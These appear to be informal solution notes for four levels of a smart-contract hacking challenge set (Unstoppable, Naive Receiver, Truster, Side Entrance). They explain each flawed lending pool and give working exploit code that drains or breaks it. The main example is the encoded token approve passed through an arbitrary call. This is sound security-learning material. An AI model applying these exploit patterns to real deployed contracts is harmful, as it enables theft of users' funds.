SOLUTIONS: 


#1- unstoppable lender:

 - simply transfer the tokens manually from the attacker to the lending pool with 
        await this.token.approve(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);
        await this.token.transfer(this.pool.address, INITIAL_ATTACKER_TOKEN_BALANCE);

        because the lending pool keeps track of the amount poolBalance and updates it only when tokens are deposiited via depositTokens() function, doing it manually will break the assertion 
         assert(poolBalance == balanceBefore);



#2 Naive Reciever- 
            in the lending pool contract, the flashlona function does not require that the borrower be the person who called the function. So we just call the flashLan function 10 times with the user's flashloanReceiver contract as the borrower. this will take 1 eth fee each time until the account is drained 

            for(let i = 0;i<10;i++){
                await this.pool.flashLoan(this.receiver.address,ethers.utils.parseEther('1'))
            }
        
        to do it in a single tx, coulddeploy a smart contract which usess a while loop to keep draining until userbalance < fee

        #3) Truster
        the vulnerability is the line
         'target.functionCall(data);'
         the target address could be the DVT erc20, and the data payload would be the token approve function, 
         which would approve attacker to spend funds in the pool. there will be no actual loan/borrow amount, 
         just this approve function, allowing the attacker to spend the pools tokens, and we can send the tokens to or address after this fucntion call is complete. 

         Solution: 
         
         let ABI = [
            "function approve(address spender, uint256 amount)"
        ];

        let iface = new ethers.utils.Interface(ABI)

        const data = iface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
        await this.pool.flashLoan(
            0,
            attacker.address,
            this.token.address,
            data
        )
        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)





#4 side-entrance: 

    To drain the funds from this simple lending pool, we take advantage of the condition check  
    'require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back"); '
    which is performed after the flashloan is executed. If we simply  depoosit the flashloan funds back into the pool from the attacking contract which executes the flashloan, then the flashloan will not revert and the 1000 eth will be changed to be reflected as the attacker balance. so after we execute the flashloan we can just call withdraw to withdraw the eth to the attacker contract, and then transfer the eth from the attacker contract to the attacker. 

    Note: the attacker contract must have a payable recieve/fallback function to recieve the eth from the lending pool when withdrawing... 